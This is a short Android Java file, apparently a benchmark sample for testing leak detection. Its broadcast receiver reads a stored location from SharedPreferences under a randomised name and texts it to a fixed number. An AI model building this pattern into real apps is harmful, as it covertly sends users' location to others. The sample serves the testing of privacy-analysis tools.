package com.example.leakviasharedpreferences;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsManager;

public class MyReceiver extends BroadcastReceiver
{

	@Override
	public void onReceive(Context context, Intent intent)
	{
		SharedPreferences settings = context.getSharedPreferences(MainActivity.PREF_PREFIX + Math.random(), 0);
		String location = settings.getString("location", "no location");
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, location, null, null);
	}
}
